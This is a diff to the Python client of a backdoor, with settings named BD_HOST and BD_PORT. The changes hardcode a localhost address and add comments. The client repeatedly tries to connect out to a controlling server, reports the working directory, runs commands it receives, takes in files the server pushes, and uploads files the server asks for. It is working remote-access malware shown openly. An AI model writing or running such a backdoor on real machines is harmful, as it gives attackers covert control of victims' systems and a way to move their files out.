@@ -2,26 +2,31 @@ import socket
 import os
 import time
 
-REMOTE_HOST = str(os.environ.get("BD_HOST"))
-REMOTE_PORT = int(os.environ.get("BD_PORT"))
+REMOTE_HOST = "127.0.0.1"  # str(os.environ.get("BD_HOST"))
+REMOTE_PORT = 5004  # int(os.environ.get("BD_PORT"))
 
 print("SET REMOTE_HOST: " + str(REMOTE_HOST))
 print("SET REMOTE_PORT: " + str(REMOTE_PORT))
 server = socket.socket()
 print("[-] Connection Initiating...")
+# loop to constantly try to reconnect if the connection fails util the connection is successfully established
 while True:
     try:
         server.connect((REMOTE_HOST, REMOTE_PORT))
         break
     except:
         print("Connection failed trying again in 5 seconds")
+        # waiting 5 seconds before trying again
         time.sleep(5)
 
 print("[-] Connection initiated!")
 restart = False
+# getting the current working directory
 pwd = os.getcwd()
+# sending it to the server so it can save it
 server.send(pwd.encode("UTF-8"))
 
+# loop to constantly wait for incoming commands
 while True:
     output = ""
 
@@ -29,7 +34,9 @@ while True:
     recvString = server.recv(1024)
     recvString = recvString.decode()
     inputList = recvString.split(" ")
+    # command variable
     command = inputList[0]
+    # list with all the given args
     args = inputList.copy()
     del (args[0])
 
@@ -54,11 +61,14 @@ while True:
             output = "No files in directory!"
         server.send(output.encode("UTF-8"))
 
+    # files that are being send by the server are accepted
+    # same principle as in the server.pys handle_command function in the download section
     elif command == "send":
         file_name = args[0]
         file_bytes = b""
         done = False
 
+        # receive all the data from the server
         while not done:
             data = server.recv(1024)
             file_bytes += data
@@ -75,6 +85,8 @@ while True:
             output = "File exists already!"
         server.send(output.encode("UTF-8"))
 
+    # files are being send to the server so the user can download them
+    # same principle as in the server.pys handle_command function in the send section
     elif command == "download":
         path = ""
         if os.path.exists(args[0]):
